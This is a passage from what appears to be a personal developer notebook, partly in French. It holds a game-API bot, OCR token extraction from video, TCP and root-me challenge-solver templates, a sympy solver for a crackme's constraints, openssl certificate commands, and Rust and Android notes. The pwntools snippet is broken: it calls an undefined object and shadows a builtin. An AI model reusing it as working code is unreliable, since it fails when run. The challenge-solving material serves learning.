        logger.debug(f&quot;\tNothing like {ref_label}.&quot;)
    return next_list


def upgrades(ref_label: str, game_map: GameResponse) -&gt; List[NextPost]:
    &quot;&quot;&quot;Strategy Upgrade.&quot;&quot;&quot;
    for item in game_map.upgrades:
        if item.name == ref_label:
            return [NextPost(shop=item.uuid)]
        logger.debug(&quot;\tNothing like %s&quot;, ref_label)
    return []


def get_map_info(cur_game: GameResponse):
    &quot;&quot;&quot;Display map info.&quot;&quot;&quot;
    logger.info(&quot;\n&quot;)
    logger.info(&quot;-&quot; * 20)
    logger.info(f&quot;Level: {cur_game.level}&quot;)
    logger.info(f&quot;Health: {cur_game.health}&quot;)
    logger.info(f&quot;Hunger: {cur_game.hunger}&quot;)
    logger.info(f&quot;Hunger actual: {cur_game.hunger_actual}&quot;)
    logger.info(f&quot;Hunger needed: {cur_game.hunger_needed}&quot;)
    logger.info(f&quot;bag =&gt; {cur_game.bag}&quot;)
    logger.info(f&quot;coin =&gt; {cur_game.coin}&quot;)

    available_items = extract_items(game_map=cur_game)
    formatted = &quot;| &quot;.join(
        [f&quot;{k} ({len(v)}): {','.join(v)}&quot; for k, v in available_items.items()]
    )
    logger.debug(f&quot;Items: {formatted}&quot;)

    # logger.debug(f&quot;Upgrades: {cur_game.upgrades}&quot;)

    achievements: List[str] = [
        f&quot;{achievement.slug}&quot;
        for achievement in cur_game.achievements
        if not achievement.acquired
    ]
    logger.info(f&quot;Achievements: {'| '.join(achievements)}&quot;)
    return len(achievements) == 0


def get_request(*, uuid: str, update: str) -&gt; List[NextPost]:
    &quot;&quot;&quot;Get request to send.&quot;&quot;&quot;
    # Send POST request with JSON data using the json parameter
    response = requests.get(URL, headers=format_header(uuid=uuid, update=update))

    if response.status_code != 200:
        logger.error(&quot;Error invalid request&quot;)

    # Print the response
    cur_game = None
    try:
        cur_game = GameResponse.model_validate(response.json())
        logger.debug(response.json())
    except:
        logger.error(&quot;!!!!!!!!!!!!!! Crash !!!!!!!!!!!!!!!&quot;)
        logger.error(response.json())
        sys.exit(1)

    # Display map
    done = get_map_info(cur_game)
    if done:
        logger.info(&quot;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; DONE &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&quot;)
        return []

    # Next pos list
    next_list: List[NextPost] = []

    # done if dead
    if cur_game.health &lt;= 0:
        logger.error(&quot;!!! You dead !!!&quot;)
        return sys.exit(1)

    strategies = get_strategy(cur_game)
    for idx, fct in enumerate(strategies):
        logger.debug(f&quot;=&gt; Apply {fct}&quot;)
        if next_pos := fct(cur_game):
            logger.debug(f&quot;\tSuccess {idx}&quot;)
            next_list += next_pos
        else:
            logger.debug(f&quot;\tFailed {idx}&quot;)

    return next_list


def post_request(*, uuid: str, itemUuid: str, shopUuid: str):
    &quot;&quot;&quot;Post request.&quot;&quot;&quot;
    # Send POST request with JSON data using the json parameter
    response = requests.post(
        URL,
        headers=format_header(
            uuid=uuid, update=&quot;true&quot;, itemUuid=itemUuid, shopUuid=shopUuid
        ),
    )
    logger.debug(f&quot;Post Answer =&gt; {response.json()}&quot;)


if __name__ == &quot;__main__&quot;:
    NEW_GAME_UUID = str(uuid1())

    # Init party
    logger.info(&quot;[Initialize new gameStart new game]&quot;)
    _ = get_request(uuid=NEW_GAME_UUID, update=&quot;false&quot;)

    logger.info(&quot;[Start challenge]&quot;)
    while True:
        next_post_list = get_request(uuid=NEW_GAME_UUID, update=&quot;true&quot;)
        if not next_post_list:
            continue

        # _ = input(&quot;Post request\n&quot;)

        logger.debug(f&quot;Post Items =&gt; {next_post_list}&quot;)
        for pos in next_post_list:
            post_request(uuid=NEW_GAME_UUID, itemUuid=pos.item, shopUuid=pos.shop)

</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="token-from-movie"><a class="header" href="#token-from-movie">Token from movie</a></h1>
<h2 id="mise-en-place-des-dépendances"><a class="header" href="#mise-en-place-des-dépendances">Mise en place des dépendances</a></h2>
<pre><code class="language-bash">$ sudo apt update
$ sudo apt install tesseract-ocr
$ sudo apt install libtesseract-dev
$ sudo apt install tesseract-ocr-eng
$ pip install Pillow
$ pip install pytesseract
$ pip install wand
$ pip install opencv-python
</code></pre>
<p>Extraction d'un token à partir d'une video</p>
<pre><code class="language-python">#! /usr/bin/env python3

import re
import sys

from PIL import Image
import pytesseract
from wand.image import Image as Img
from pathlib import Path

import cv2

import click

# Pattern to be find
PATTERN = re.compile(r&quot;([0-9]{4})&quot;, re.IGNORECASE)

def rm_tree(pth: Path):
    &quot;&quot;&quot;Remove recursive of folder.&quot;&quot;&quot;
    if not pth.exists():
        return
    for child in pth.glob(&quot;*&quot;):
        if child.is_file():
            child.unlink()
        else:
            rm_tree(child)
    pth.rmdir()


def setup(movie_path: Path):
    &quot;&quot;&quot;Clean temporary folder&quot;&quot;&quot;
    rm_tree(movie_path)
    movie_path.mkdir()


def files(movie_path: Path, working_area: Path) -&gt; cv2.VideoCapture:
    &quot;&quot;&quot;Read video.&quot;&quot;&quot;
    setup(working_area)

    # specify the source video path
    src_vid = cv2.VideoCapture(str(movie_path))
    return src_vid

def process(src_video: cv2.VideoCapture, rate, working_area: Path):
    &quot;&quot;&quot;Process video.&quot;&quot;&quot;
    # Check if file is open
    if not src_video.isOpened():
        print(&quot;[!] Video stream is closed&quot;)
        sys.exit(1)

    # Integer name file
    index = 0
    while src_video.isOpened():
        ret, frame = src_video.read()
        if not ret:
            break

        # name each frame and save s png
        name = Path(working_area) / Path(f&quot;frame{index}.png&quot;)
        # 
        # Save every rate th
        if not (index % rate):
            cv2.imwrite(str(name.absolute()), frame)
        index += 1

        if cv2.waitKey(10) &amp; 0xFF == ord('q'):
            break
    src_video.release()
    cv2.destroyAllWindows()

def get_token(working_area: Path) -&gt; str:
    &quot;&quot;&quot;Looking for token.&quot;&quot;&quot;
    for pic in Path(working_area).glob(&quot;*.png&quot;):
        cur_pic = Image.open(str(pic.absolute()))
        text = pytesseract.image_to_string(cur_pic, lang='eng')
        
        if &quot;code&quot; in text:
            text = text.replace(&quot;\n&quot;, &quot;&quot;)
            res = PATTERN.findall(text)[0]
            return f&quot;{res}&quot;

    return &quot;&quot;

@click.command(
    context_settings={&quot;help_option_names&quot;: [&quot;-h&quot;, &quot;--help&quot;]},
    help=&quot;Extract token from pictures.&quot;,
)
@click.argument(
    &quot;movie_path&quot;,
    type=click.Path(exists=True, file_okay=True, dir_okay=False),
    metavar=&quot;MOVIE_PATH&quot;,
)
@click.option(
    &quot;--rate&quot;, 
    default=100, 
    help=&quot;Rate of picture to extract text.&quot;,
    show_default=True
)
@click.option(
    &quot;--working_area&quot;,
    type=click.Path(exists=False, file_okay=False, dir_okay=True),
    default=&quot;image_frames&quot;, 
    help=&quot;Temporary folder.&quot;,
    show_default=True
)
def find_token(movie_path: str, rate: int, working_area: str):
    working_area = Path(working_area)

    vid = files(Path(movie_path), working_area)
    process(vid, rate, working_area)
    print(&quot;[+] Token for %s =&gt; '%s'&quot;, movie_path, get_token(working_area))

if __name__ == &quot;__main__&quot;:
    find_token()  # pylint: disable=E1120
</code></pre>
<h2 id="utilisation"><a class="header" href="#utilisation">Utilisation</a></h2>
<pre><code class="language-bash">&gt; ./script.py --rate 10 ./movie.mp4
Token for ./movie.mp4 =&gt; 'XXXX'
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="get-and-post-1"><a class="header" href="#get-and-post-1">Get and Post</a></h1>
<p>Simple petit script pour résoudre un challenge mis à dispo. par un server.</p>
<h2 id="server"><a class="header" href="#server">Server</a></h2>
<pre><code class="language-python">#!/usr/bin/env python3
&quot;&quot;&quot;
TCP challenge helper
&quot;&quot;&quot;

from typing import Optional
import socket
from functools import partial

import click

# ------------------------- [SERVER] -------------------------#


class Server:
    &quot;&quot;&quot;
    Server object to keep socker open.
    &quot;&quot;&quot;

    def __init__(self, host: str, port: int):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        click.echo(f&quot;Open new socket {host}:{port}&quot;)
        self.socket.connect((host, port))
        click.echo(f&quot;Connection on {port}&quot;)

    def send_answer(self, answer: str) -&gt; str:
        &quot;&quot;&quot;Send answer then return server answer.&quot;&quot;&quot;
        click.echo(f&quot;Send answer: {answer}&quot;)
        self.socket.sendall(answer.encode(&quot;utf-8&quot;))
        return self.receive_data()

    def receive_data(self) -&gt; str:
        &quot;&quot;&quot;Receive data.&quot;&quot;&quot;
        click.echo(&quot;Call receive data&quot;)
        data = self.socket.recv(1024).decode(&quot;utf-8&quot;)
        click.echo(f&quot;Received '{repr(data)}'&quot;)
        return data


# ------------------------- [COMMANDS] -------------------------#


def entry_point(server, _) -&gt; str:
    &quot;&quot;&quot;First call to starting challenge&quot;&quot;&quot;
    incoming_data = server.receive_data()
    click.echo(f&quot;Challenge to solve : '{incoming_data}'&quot;)
    return incoming_data


# ------------------------- [BODY] -------------------------#

@click.command(
    context_settings={&quot;help_option_names&quot;: [&quot;-h&quot;, &quot;--help&quot;]},
    help=&quot;Tcp Challenge solver&quot;,
)
@click.option(&quot;--host&quot;, type=click.STRING, help=&quot;Domain name.&quot;, required=True)
@click.option(&quot;--port&quot;, type=click.INT, help=&quot;TCP port.&quot;, required=True)
@click.option(
    &quot;--stop_condition&quot;, type=click.STRING, help=&quot;String to detect to stop running&quot;
)
def start_challenge(host: str, port: int, stop_condition: Optional[str]):
    &quot;&quot;&quot;Starting point to solve challenge.&quot;&quot;&quot;
    click.clear()

    click.echo(f&quot;Connect to server {host}:{port}&quot;)
    server = Server(host, port)

    # Define list of command
    commands = [
        partial(entry_point, server),
        # List of command like 
        # partial(fct, server),
    ]

    # Receive challenge
    previous_answer = &quot;&quot;
    flag = None
    for fct in commands:
        previous_answer = fct(previous_answer)
        if stop_condition and stop_condition in previous_answer:
            flag = previous_answer
            break

    if not flag:
        flag = previous_answer
    click.echo(f&quot;[🏆] '{flag}'&quot;)


if __name__ == &quot;__main__&quot;:
    start_challenge()  # pylint: disable=no-value-for-parameter
</code></pre>
<h2 id="here-are-some-snippet-command"><a class="header" href="#here-are-some-snippet-command">Here are some snippet command</a></h2>
<ul>
<li>Use regular expression and math</li>
</ul>
<pre><code class="language-python">import re
import math

def use_regexp_math(server, input_data: str) -&gt; str:
    &quot;&quot;&quot;Use RegExp and math&quot;&quot;&quot;
    click.echo(f&quot;Challenge to solve : '{input_data}'&quot;)

    # Get number
    regexp = re.compile(
        &quot;Number to sqrt ([0-9]*) and multiple by ([0-9]*)&quot;
    )
    match = re.search(regexp, input_data)
    to_sqrt_nbr = int(match.group(1))
    multi_nbr = int(match.group(2))

    # Compute
    result = math.sqrt(multi_nbr)
    click.echo(f&quot;Square of {multi_nbr} {result}&quot;)
    result *= multi_nbr
    click.echo(f&quot;Result {result}&quot;)
    result = round(result, 2)
    click.echo(f&quot;Round result {result}&quot;)

    # Send result
    return server.send_answer(f&quot;{str(result)}\n&quot;)
</code></pre>
<ul>
<li>Use base64 and zlib</li>
</ul>
<pre><code class="language-python">import base64
import zlib

def ub64_and_zlib_decompress(server, input_data: str) -&gt; str:
    &quot;&quot;&quot;Decompress after debase 64 strings&quot;&quot;&quot;
    msg = input_data.split(&quot;'&quot;)[1]
    click.echo(f&quot;Message to decode =&gt; '{msg}'&quot;)
    result = zlib.decompress(base64.b64decode(msg))
    answer = server.send_answer(f&quot;{str(result)}\n&quot;)
    click.echo(f&quot;Answer =&gt; '{answer}'&quot;)

    return answer
</code></pre>
<ul>
<li>Use split</li>
</ul>
<pre><code class="language-python">def split_and_collect(server, input_data):
    &quot;&quot;&quot;Split part of input the format.&quot;&quot;&quot;
    click.echo(&quot;Use split&quot;)

    nbrs = input_data[1:-2].split(&quot;,&quot;)
    order_nbrs = sorted(map(int, nbrs))
    orders_input_data = [str(s) for s in order_nbrs]
    res = f&quot;[{','.join(orders_input_data)}]&quot;

    # Result
    click.echo(f&quot;Result '{res}'&quot;)
    return server.send_answer(f&quot;{res}&quot;)
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="simple-https-server-with-gunicor-and-flask"><a class="header" href="#simple-https-server-with-gunicor-and-flask">Simple HTTP(s) server with Gunicor and Flask</a></h1>
<h2 id="code"><a class="header" href="#code">Code</a></h2>
<h2 id="gunicorn-https-certificate-and-keys"><a class="header" href="#gunicorn-https-certificate-and-keys">Gunicorn HTTPs certificate and keys</a></h2>
<pre><code class="language-shell">$ gunicorn  wsgi:app \
            --bind 0.0.0.0:8080 \
            --log-level=debug \
            --workers=4 \
            --keyfile private_key.pem \
            --certfile certificate.pem
</code></pre>
<h3 id="generate-certificate-and-key-for-test"><a class="header" href="#generate-certificate-and-key-for-test">Generate certificate and key for test</a></h3>
<ol>
<li>Creating a Private Key</li>
</ol>
<pre><code class="language-shell"># 3DES encrypted
$ openssl genrsa -des3 -out domain.key 2048
# unencrypted
$ openssl genrsa -out domain.key 2048
</code></pre>
<ol start="2">
<li>Creating a Certificate Signing Request (CSR)</li>
</ol>
<pre><code class="language-shell">$ openssl req -key domain.key -new -out domain.csr
</code></pre>
<p>An important field is “Common Name,” which should be the exact Fully Qualified Domain Name (FQDN) of our domain.</p>
<p><em>“A challenge password” and “An optional company name” can be left empty.</em></p>
<p><strong>One line Private Key and CSR</strong></p>
<pre><code class="language-shell"># 3DES encrypted
$ openssl req -newkey rsa:2048 -keyout domain.key -out domain.csr
# unencrypted
$ openssl req -newkey rsa:2048 -nodes -keyout domain.key -out domain.csr
</code></pre>
<ol start="3">
<li>Creating a Self-Signed Certificate</li>
</ol>
<pre><code class="language-shell">$ openssl x509 -signkey domain.key -in domain.csr -req -days 365 -out domain.crt
</code></pre>
<p>Our certificate (domain.crt) is <strong>an X.509 certificate that’s ASCII PEM-encoded.</strong></p>
<p>Here is the one line to create private key and a self-signed certificate (CSR tmp will be created)</p>
<pre><code class="language-shell">$ openssl req -newkey rsa:2048 -keyout domain.key -x509 -days 365 -out domain.crt
</code></pre>
<ul>
<li>View certificat</li>
</ul>
<pre><code class="language-shell">$ openssl x509 -text -noout -in domain.crt
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="use-pwntool-for-server-challenge-solver"><a class="header" href="#use-pwntool-for-server-challenge-solver">Use pwntool for server challenge solver</a></h1>
<pre><code class="language-python">#!/usr/bin/env python3

from pwn import *

r = remote('challenge01.root-me.org', 52022)
io = process(['echo', 'hi'])
io.recvline()

msg = input.split(&quot;\'&quot;)[1]
print(f&quot;Message to decode =&gt; '{msg}'&quot;)
result = zlib.decompress(base64.b64decode(msg))
answer = server.send_answer(f&quot;{str(result)}\n&quot;)
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="solve-equations-with-different-unknown"><a class="header" href="#solve-equations-with-different-unknown">Solve equations with different unknown</a></h1>
<pre><code class="language-python">#!/usr/bin/env python3

&quot;&quot;&quot;Solve

&lt;JAVA&gt;
char c = charArray[0];
char c2 = charArray[3];
char c3 = charArray[6];
if (c + c2 + c3 == 154) {
char c4 = charArray[1];
char c5 = charArray[4];
char c6 = charArray[7];
if (c4 + c5 + c6 == 159) {
char c7 = charArray[2];
char c8 = charArray[5];
char c9 = charArray[8];
if (c7 + c8 + c9 == 156) {
char c10 = charArray[9];
char c11 = charArray[12];
char c12 = charArray[15];
if (c10 + c11 + c12 == 169) {
char c13 = charArray[10];
char c14 = charArray[13];
char c15 = charArray[16];
if (c13 + c14 + c15 == 152) {
char c16 = charArray[11];
char c17 = charArray[14];
char c18 = charArray[17];
if (c16 + c17 + c18 == 155) {
char c19 = charArray[18];
char c20 = charArray[19];
bool = false;
if (c19 + c20 == 107 &amp;&amp; c + c5 + c9 == 156 &amp;&amp; c7 + c5 + c3 == 159 &amp;&amp; c10 + c14 + c18 == 155 &amp;&amp; c16 + c14 + c12 == 155 &amp;&amp; c + c10 + c19 == 163 &amp;&amp; c2 + c11 + c20 == 159 &amp;&amp; c3 + c12 == 108 &amp;&amp; c4 + c + c7 == 152 &amp;&amp; c2 + c5 + c8 == 166 &amp;&amp; c3 + c6 + c9 == 151 &amp;&amp; c13 + c10 + c16 == 154 &amp;&amp; c11 + c14 + c17 == 161 &amp;&amp; c12 + c15 + c18 == 161 &amp;&amp; c + '\n' == 59 &amp;&amp; c6 + '\n' == 60 &amp;&amp; c10 + '\n' == 67 &amp;&amp; c19 + '\n' == 67 &amp;&amp; c8 + c6 == 105 &amp;&amp; c17 + c18 == 106)
&lt;\JAVA&gt;
&quot;&quot;&quot;

from sympy import symbols, Eq, solve

code = ['x']*20

# Déclaration des variables
c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11, c12, c13, c14, c15, c16,  c17, c18, c19, c20 = symbols('c1 c2 c3 c4 c5 c6 c7 c8 c9 c10 c11 c12 c13 c14 c15 c16  c17 c18 c19 c20')

code_map = {
    c1: 0,
    c2: 3,
    c3: 6,
    c4: 1,
    c5: 4,
    c6: 7,
    c7: 2,
    c8: 5,
    c9: 8,
    c10: 9,
    c11: 12,
    c12: 15,
    c13: 10,
    c14: 13,
    c15: 16,
    c16: 11,
    c17: 14,
    c18: 17,
    c19: 18,
    c20: 19
}

# equation list
equations = [
    Eq(c7 + c8 + c9, 156),
    Eq(c10 + c11 + c12, 169),
    Eq(c13 + c14 + c15, 152),
    Eq(c16 + c17 + c18, 155),
    Eq(c4 + c5 + c6, 159),
    Eq(c1 + c2 + c3, 154),
    Eq(c19 + c20, 107 ),
    Eq(c1 + c5 + c9, 156 ),
    Eq(c7 + c5 + c3, 159 ),
    Eq(c10 + c14 + c18, 155 ),
    Eq(c16 + c14 + c12, 155 ),
    Eq(c1 + c10 + c19, 163 ),
    Eq(c2 + c11 + c20, 159 ),
    Eq(c3 + c12, 108 ),
    Eq(c4 + c1 + c7, 152 ),
    Eq(c2 + c5 + c8, 166 ),
    Eq(c3 + c6 + c9, 151 ),
    Eq(c13 + c10 + c16, 154 ),
    Eq(c11 + c14 + c17, 161 ),
    Eq(c12 + c15 + c18, 161 ),
    Eq(c1 + 10, 59 ),
    Eq(c6 + 10, 60 ),
    Eq(c10 + 10, 67 ),
    Eq(c19 + 10, 67 ),
    Eq(c8 + c6, 105 ),
    Eq(c17 + c18, 106),
]

# solve system
solutions = solve(equations)

print(f&quot;Solution =&gt; {solutions}&quot;)
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="rust"><a class="header" href="#rust">Rust</a></h1>
<h2 id="setup-rust-"><a class="header" href="#setup-rust-">Setup rust 💻</a></h2>
<ol>
<li>Install the <a href="https://www.rust-lang.org/tools/install">Rust toolchain</a>.</li>
<li>(recommended) Install the <a href="https://rust-analyzer.github.io/manual.html">rust-analyzer</a> extension for your code editor.</li>
<li>(optional) Install a native debugger. If you are using VS Code, <a href="https://marketplace.visualstudio.com/items?itemName=vadimcn.vscode-lldb">CodeLLDB</a> is a good option.</li>
</ol>
<h2 id="use-vs-code-to-debug-your-code"><a class="header" href="#use-vs-code-to-debug-your-code">Use VS Code to debug your code</a></h2>
<ol>
<li>Install <a href="https://marketplace.visualstudio.com/items?itemName=rust-lang.rust-analyzer">rust-analyzer</a> and <a href="https://marketplace.visualstudio.com/items?itemName=vadimcn.vscode-lldb">CodeLLDB</a>.</li>
<li>Set breakpoints in your code.</li>
<li>Click <em>Debug</em> next to the unit test or the <em>main</em> function.</li>
<li>The debugger will halt your program at the specific line and allow you to inspect the local stack.</li>
</ol>
<h2 id="useful-tools"><a class="header" href="#useful-tools">Useful Tools</a></h2>
<ul>
<li><a href="https://github.com/rust-lang/rust-clippy">clippy</a>: The official Rust linter.</li>
<li><a href="https://github.com/rust-lang/rustfmt">rustfmt</a>: The official Rust code formatter. </li>
</ul>
<h2 id="useful-crates"><a class="header" href="#useful-crates">Useful crates</a></h2>
<ul>
<li>
<p><a href="https://crates.io/crates/itertools">itertools</a>: Extends iterators with extra methods and adaptors. Frequently useful for aoc puzzles.</p>
</li>
<li>
<p><a href="https://crates.io/crates/regex">regex</a>: Official regular expressions implementation for Rust.;</p>
</li>
<li>
<p><a href="https://lib.rs/crates/chrono">chrono</a>: The most comprehensive and full-featured datetime library, but more complex because of it.</p>
</li>
<li>
<p><a href="https://lib.rs/crates/serde">serde</a>: De facto standard serialization library. Use in conjunction with sub-crates like serde_json for the specific format that you are using. </p>
</li>
<li>
<p><a href="https://lib.rs/crates/anyhow">anyhow</a>: Provides a boxed error type that can hold any error, and helpers for generating an application-level stack trace.</p>
</li>
<li>
<p><a href="https://lib.rs/crates/thiserror">thiserror</a>: Helps with generating boilerplate for enum-style error types. </p>
</li>
</ul>
<h2 id="crates"><a class="header" href="#crates">Crates</a></h2>
<p>A curated list of popular crates can be found on <a href="https://blessed.rs/crates">blessred.rs</a>.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="snippets-1"><a class="header" href="#snippets-1">Snippets</a></h1>
<p>Some useful snippet code from AOC (Advent Of Code)</p>
<style>
.badge_module {
  background-color: #ffc107;
  color: black;
  padding: 4px 8px;
  text-align: center;
  border-radius: 5px;
}
.badge_theme {
  background-color: #3a87ad;
  color: white;
  padding: 4px 8px;
  text-align: center;
  border-radius: 5px;
}
</style>
<table>
    <thead>
        <tr>
            <th>Folder</th>
            <th>Tags</th>
            <th>Description</th>
        </tr>
    </thead>
    <tbody>
        <!-- ITEM --> 
        <tr>
            <td rowspan="2">Example</td>
            <td>
                <span class="badge_module">Module 1</span>
            </td>
            <td rowspan="2">BlaBlaBla.</td>
        </tr>
        <tr>
            <td>
                <span class="badge_theme">Theme</span>
            </td>
        </tr>
    </tbody>
</table><div style="break-before: page; page-break-before: always;"></div><h1 id="exemple-of-error-management"><a class="header" href="#exemple-of-error-management">Exemple of error management</a></h1>
<p>Good reference: <a href="https://mmapped.blog/posts/12-rust-error-handling.html">Designing error types in Rust</a></p>
<h2 id="tcp-echo-project"><a class="header" href="#tcp-echo-project">TCP Echo project</a></h2>
<pre><code>Project
    ├── Cargo.toml
    ├── index.html
    └── src
        ├── error.rs
        ├── lib.rs
        └── main.rs
</code></pre>
<ul>
<li>Cargo.toml</li>
</ul>
<pre><code class="language-toml">[package]
name = &quot;tcp_echo&quot;
version = &quot;0.1.0&quot;
edition = &quot;2021&quot;

[dependencies]
</code></pre>
<ul>
<li>index.html</li>
</ul>
<pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
  &lt;head&gt;
    &lt;meta charset=&quot;utf-8&quot;&gt;
    &lt;title&gt;Rust&lt;/title&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;h1&gt;Hello World!&lt;/h1&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<ul>
<li>error.rs</li>
</ul>
<pre><code class="language-rs">#[derive(Debug)]
pub enum AppError {
    Io(std::io::Error),
    Utf8(std::string::FromUtf8Error),
    General(String),
}

impl std::fmt::Display for AppError {
    fn fmt(&amp;self, f: &amp;mut std::fmt::Formatter&lt;'_&gt;) -&gt; std::fmt::Result {
        match self {
            AppError::Io(e) =&gt; write!(f, &quot;IO error: {}&quot;, e),
            AppError::Utf8(e) =&gt; write!(f, &quot;UTF-8 error: {}&quot;, e),
            AppError::General(s) =&gt; write!(f, &quot;General error: {}&quot;, s),
        }
    }
}

impl From&lt;std::io::Error&gt; for AppError {
    fn from(e: std::io::Error) -&gt; Self {
        Self::Io(e)
    }
}
impl From&lt;std::string::FromUtf8Error&gt; for AppError {
    fn from(e: std::string::FromUtf8Error) -&gt; Self {
        Self::Utf8(e)
    }
}

pub type AppResult&lt;T&gt; = Result&lt;T, AppError&gt;;

</code></pre>
<ul>
<li>lib.rs</li>
</ul>
<pre><code class="language-rs">pub mod error;
</code></pre>
<ul>
<li>main.rs</li>
</ul>
<pre><code class="language-rs">use std::io::BufReader;
use std::io::prelude::*;
use std::net::TcpListener;
use std::net::TcpStream;

use tcp_echo::error::AppResult;

fn main() {
    match start_server(&quot;127.0.0.1:8080&quot;) {
        Ok(_) =&gt; println!(&quot;Server ending&quot;),
        Err(_) =&gt; println!(&quot;Server failed&quot;),
    }
}

fn start_server(url: &amp;str) -&gt; AppResult&lt;()&gt; {
    let listener = TcpListener::bind(url)?;
    println!(&quot;Listening on port 8080&quot;);

    for stream in listener.incoming() {
        let stream = stream?;
        println!(&quot;Connection established!&quot;);
        handle_connection(stream);
    }
    Ok(())
}

fn handle_connection(mut stream: TcpStream) {
    let buf_reader = BufReader::new(&amp;mut stream);
    let http_request: Vec&lt;_&gt; = buf_reader
        .lines()
        .map(|result| result.unwrap())
        .take_while(|line| !line.is_empty())
        .collect();
    println!(&quot;Request: {:#?}&quot;, http_request);
}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><pre><code>                                                                      
   ▄▄▄▄                           ██                  ██              
  ██▀▀██               ██         ▀▀                  ▀▀              
 ██    ██  ██▄███▄   ███████    ████     ████▄██▄   ████     ████████ 
 ██    ██  ██▀  ▀██    ██         ██     ██ ██ ██     ██         ▄█▀  
 ██    ██  ██    ██    ██         ██     ██ ██ ██     ██       ▄█▀    
  ██▄▄██   ███▄▄██▀    ██▄▄▄   ▄▄▄██▄▄▄  ██ ██ ██  ▄▄▄██▄▄▄  ▄██▄▄▄▄▄ 
   ▀▀▀▀    ██ ▀▀▀       ▀▀▀▀   ▀▀▀▀▀▀▀▀  ▀▀ ▀▀ ▀▀  ▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀ 
           ██                                                         
                                                                      
                                                  
                        ██                        
             ██         ▀▀                        
  ▄█████▄  ███████    ████      ▄████▄   ██▄████▄ 
  ▀ ▄▄▄██    ██         ██     ██▀  ▀██  ██▀   ██ 
 ▄██▀▀▀██    ██         ██     ██    ██  ██    ██ 
 ██▄▄▄███    ██▄▄▄   ▄▄▄██▄▄▄  ▀██▄▄██▀  ██    ██ 
  ▀▀▀▀ ▀▀     ▀▀▀▀   ▀▀▀▀▀▀▀▀    ▀▀▀▀    ▀▀    ▀▀ 
</code></pre>
<h2 id="toml-file"><a class="header" href="#toml-file">TOML file</a></h2>
<pre><code class="language-toml">[package]
name = &quot;ApplicationNAme&quot;
version = &quot;0.0.1&quot;
edition = &quot;2021&quot;
publish = false

[lib]
crate-type = [&quot;cdylib&quot;, &quot;lib&quot;]

[[bin]]
name = &quot;app_bin&quot;
path=&quot;./path/to/bin_main.rs&quot;

[profile.release]
# Disable debug
debug=false
# Optimization Level
opt-level = 's'
# Link Time Optimization (LTO)
lto = true
# Parallel Code Generation Units
codegen-units = 1
# Strip source code
strip = true
# Compilation behavior.
panic = &quot;abort&quot;

[profile.dev]
# Incremental compilation
incremental = true
# Disable debug
debug=false
# Optimization Level
opt-level = 0
# Link Time Optimization (LTO)
lto = true
# Parallel Code Generation Units
codegen-units = 1
# Strip source code
strip = true
# Compilation behavior.
panic = &quot;unwind&quot;

# Production App. dependencies
[dependencies]

# Dev App. dependencies
[dev-dependencies]
</code></pre>
<h2 id="crates-optimization"><a class="header" href="#crates-optimization">Crates optimization</a></h2>
<p><a href="https://oknozor.github.io/blog/optimize-rust-binary-size/">Okno's Blog (Ref)</a></p>
<h3 id="crates-size"><a class="header" href="#crates-size">Crates size</a></h3>
<ul>
<li>Get <code>crate</code> size</li>
</ul>
<pre><code class="language-shell"># After comment 'strip option'
$ cargo bloat --crates --release
</code></pre>
<ul>
<li>Duplicate crates</li>
</ul>
<pre><code class="language-shell">$ cargo tree --duplicates -e=no-dev
</code></pre>
<ul>
<li>Graph dependencies</li>
</ul>
<pre><code class="language-shell">cargo depgraph | dot -Tpng &gt; graph.png
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="minimal-project-in-java-to-create-apk"><a class="header" href="#minimal-project-in-java-to-create-apk">Minimal project in JAVA to create APK</a></h1>
<p>Minimal requirement to create APK</p>
<p>Archive: <a href="dev/Android/MinimalProject/./app.tar.gz">Project Template</a></p>
<h2 id="project-structure"><a class="header" href="#project-structure">Project Structure</a></h2>
<pre><code>ProjectFolder
    ├── app
    │   └── src
    │       └── main
    │           ├── AndroidManifest.xml
    │           ├── java
    │           │   └── com
    │           │       └── example
    │           │           └── myapp
    │           │               ├── MainActivity.java
    │           │               └── MainApp.java
    │           └── res
    │               └── values
    │                   └── values.xml
    └── Makefile
</code></pre>
<h2 id="files-contains"><a class="header" href="#files-contains">Files contains</a></h2>
<ul>
<li>AndroidManifest.xml</li>
</ul>
<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; package=&quot;com.example.myapp&quot;&gt;
    &lt;uses-sdk android:minSdkVersion=&quot;30&quot; android:targetSdkVersion=&quot;34&quot; /&gt;
    &lt;application
        android:label=&quot;@string/myAppName&quot;&gt;
        &lt;activity
            android:name=&quot;com.example.myapp.MainActivity&quot; 
            android:exported=&quot;true&quot;&gt;
            &lt;intent-filter&gt;
                &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;
                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;
            &lt;/intent-filter&gt;
        &lt;/activity&gt;
    &lt;/application&gt;
&lt;/manifest&gt;
</code></pre>
<ul>
<li>MainActivity.java</li>
</ul>
<pre><code class="language-java">package com.example.myapp;

import android.os.Bundle;

import java.lang.reflect.Method;

import android.app.Activity;
import android.content.Intent;
import android.util.Log;
import android.widget.TextView;

public class MainActivity extends Activity {
